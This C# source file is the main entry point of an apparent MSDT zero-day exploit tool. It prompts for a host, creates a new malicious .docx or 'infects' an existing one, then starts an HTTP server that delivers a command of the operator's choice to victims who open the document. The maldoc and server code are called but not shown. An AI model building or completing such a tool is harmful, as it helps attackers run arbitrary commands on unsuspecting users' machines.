using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace MSDT_Zero_Day
{
    public class Program
    {
        public static void Main(string[] args)
        {
            BetterConsole.WriteLine("Example: http://localhost:8888");
            BetterConsole.WriteSelection("Host: ");
            string? host = Console.ReadLine();

        recheck:
            if (host.EndsWith('/'))
            {
                host = host.Substring(0, host.Length - 1);
                goto recheck;
            }

            BetterConsole.WriteNumber(1, "Generate new payload", ConsoleColor.Magenta);
            BetterConsole.WriteNumber(2, "Generate new paylod from existing .docx", ConsoleColor.Magenta);
            BetterConsole.WriteNumber(3, "Skip to start server", ConsoleColor.Magenta);

            ConsoleKeyInfo key = Console.ReadKey(true);
            switch (key.Key)
            {
                case ConsoleKey.D1:
                    CreateMaldoc.CreateDocx(host);
                    break;

                case ConsoleKey.D2:
                    BetterConsole.WriteSelection("File Path: ");
                    string? path = Console.ReadLine();
                    if (!File.Exists(path) || Path.GetExtension(path) != ".docx")
                        Console.WriteLine("File doesnt exist, or is not a .docx document!");
                    else
                        CreateMaldoc.InfectDocx(path, host);
                    break;
            }

            int port = 8888;
            if (host.Contains(':'))
                port = Convert.ToInt32(host.Split(':')[2].Split('/')[0]);
            else
            {
            retry:
                BetterConsole.WriteSelection("Hosting Port: ");
                try { port = Convert.ToInt32(Console.ReadLine()); }
                catch
                {
                    BetterConsole.WriteMinus("that is not a port!");
                    goto retry;
                }
            }
            BetterConsole.WriteSelection("Command: ");
            string? command = Console.ReadLine();
            HttpServer.StartServer(port, command);

            BetterConsole.WriteWarning("Program has finished all tasks, Press enter to close...");
            Console.ReadLine();
        }
    }
}